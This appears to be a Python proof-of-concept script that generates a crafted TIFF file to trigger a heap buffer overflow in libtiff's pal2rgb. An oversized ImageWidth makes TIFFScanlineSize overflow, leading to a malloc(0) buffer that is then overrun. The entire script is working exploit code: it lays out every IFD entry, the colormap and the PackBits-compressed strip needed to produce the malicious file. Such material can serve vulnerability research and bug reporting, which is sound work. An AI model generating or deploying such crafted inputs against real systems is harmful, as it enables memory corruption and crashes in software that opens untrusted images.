#!/usr/bin/env python3
"""
PoC generator for libtiff pal2rgb VULN 001:
Heap buffer overflow via TIFFScanlineSize integer overflow
writing to malloc(0) obuf.

When imagewidth=178956971 with PHOTOMETRIC_PALETTE, BitsPerSample=8,
SamplesPerPixel=1 (input), pal2rgb will produce an output RGB TIFF with
samplesperpixel=3. TIFFScanlineSize(out) computes imagewidth*3*8=536870913*8
which overflows uint32 to 8, returning 0. obuf = _TIFFmalloc(0) on Linux
returns a valid non-NULL pointer to a 0-byte allocation. The pixel copy
loop then writes ~536MB into this 0-byte region -> heap buffer overflow.
"""

import struct
import sys

# TIFF parameters
IMAGEWIDTH   = 178956971
IMAGELENGTH  = 1
BITSPERSAMPLE = 8
COMPRESSION  = 32773  # PackBits
PHOTOMETRIC  = 3      # PALETTE
SAMPLESPERPIXEL = 1
ROWSPERSTRIP = 1

def packbits_zeros(n):
    """Encode n zero bytes using PackBits compression.

    PackBits run of N identical bytes (2 <= N <= 128):
      write signed byte (1-N), then the repeated byte value.
    For N=128: (1-128) = -127 = 0x81
    """
    full_runs = n // 128
    remainder = n % 128

    # 1398101 runs of 128 zero bytes: each is bytes [0x81, 0x00]
    data = bytearray(b'\x81\x00' * full_runs)

    if remainder > 0:
        # (1 - remainder) as unsigned byte
        run_header = (1 - remainder) & 0xFF
        data += bytearray([run_header, 0x00])

    return bytes(data)


def build_tiff():
    # --- PackBits strip data ---
    strip_data = packbits_zeros(IMAGEWIDTH)
    strip_size = len(strip_data)

    # --- Layout plan ---
    # Offset 0: 8-byte header
    # Offset 8: IFD (2 + 10*12 + 4 = 126 bytes)
    # Offset 134: Colormap (768 SHORTs = 1536 bytes)
    # Offset 1670: strip data

    ifd_offset    = 8
    num_entries   = 10
    ifd_size      = 2 + num_entries * 12 + 4   # 126 bytes
    colormap_off  = ifd_offset + ifd_size        # 134
    strip_off     = colormap_off + 768 * 2       # 1670

    # --- TIFF header (little-endian) ---
    header = b'\x49\x49'                          # 'II' byte order
    header += struct.pack('<H', 42)               # magic
    header += struct.pack('<I', ifd_offset)       # offset to first IFD

    # --- IFD entries (must be sorted by tag number) ---
    # Format for LONG (type=4): pack('<HHII', tag, 4, count, value)
    # Format for SHORT (type=3), count=1: pack('<HHIHH', tag, 3, 1, value, 0)
    # Format for SHORT (type=3), count>1: pack('<HHII', tag, 3, count, offset)

    ifd_entries = []

    # 0x0100 (256): ImageWidth = 178956971 (LONG)
    ifd_entries.append(struct.pack('<HHII', 0x0100, 4, 1, IMAGEWIDTH))

    # 0x0101 (257): ImageLength = 1 (LONG)
    ifd_entries.append(struct.pack('<HHII', 0x0101, 4, 1, IMAGELENGTH))

    # 0x0102 (258): BitsPerSample = 8 (SHORT, inline)
    ifd_entries.append(struct.pack('<HHIHH', 0x0102, 3, 1, BITSPERSAMPLE, 0))

    # 0x0103 (259): Compression = 32773 PackBits (SHORT, inline)
    ifd_entries.append(struct.pack('<HHIHH', 0x0103, 3, 1, COMPRESSION, 0))

    # 0x0106 (262): PhotometricInterpretation = 3 PALETTE (SHORT, inline)
    ifd_entries.append(struct.pack('<HHIHH', 0x0106, 3, 1, PHOTOMETRIC, 0))

    # 0x0111 (273): StripOffsets = strip_off (LONG, count=1, inline)
    ifd_entries.append(struct.pack('<HHII', 0x0111, 4, 1, strip_off))

    # 0x0115 (277): SamplesPerPixel = 1 (SHORT, inline)
    ifd_entries.append(struct.pack('<HHIHH', 0x0115, 3, 1, SAMPLESPERPIXEL, 0))

    # 0x0116 (278): RowsPerStrip = 1 (LONG, inline)
    ifd_entries.append(struct.pack('<HHII', 0x0116, 4, 1, ROWSPERSTRIP))

    # 0x0117 (279): StripByteCounts = strip_size (LONG, count=1, inline)
    ifd_entries.append(struct.pack('<HHII', 0x0117, 4, 1, strip_size))

    # 0x0140 (320): Colormap - 768 SHORTs all zero, stored at colormap_off
    ifd_entries.append(struct.pack('<HHII', 0x0140, 3, 768, colormap_off))

    assert len(ifd_entries) == num_entries, "Entry count mismatch"
    for e in ifd_entries:
        assert len(e) == 12, f"Entry not 12 bytes: {len(e)}"

    # Build IFD block
    ifd = struct.pack('<H', num_entries)
    for e in ifd_entries:
        ifd += e
    ifd += struct.pack('<I', 0)  # next IFD offset = 0 (no more IFDs)

    assert len(ifd) == ifd_size, f"IFD size mismatch: {len(ifd)} vs {ifd_size}"

    # Colormap: 768 SHORTs, all zero (palette with black for all entries)
    colormap = b'\x00' * (768 * 2)

    # Assemble the complete TIFF file
    tiff = header + ifd + colormap + strip_data

    out_path = 'vuln_001.tif'
    with open(out_path, 'wb') as f:
        f.write(tiff)

    print(f"[+] Written {out_path}: {len(tiff)} bytes total")
    print(f"    IFD at offset {ifd_offset}, {num_entries} entries")
    print(f"    Colormap at offset {colormap_off} ({768*2} bytes)")
    print(f"    Strip at offset {strip_off}, size {strip_size} bytes")
    print(f"    ImageWidth = {IMAGEWIDTH}")
    print(f"    PackBits: {IMAGEWIDTH // 128} full runs of 128, "
          f"remainder {IMAGEWIDTH % 128} bytes")
    print(f"    Expected: TIFFScanlineSize overflow -> obuf=malloc(0) -> "
          f"heap overflow writing {IMAGEWIDTH * 3} bytes")


if __name__ == '__main__':
    build_tiff()
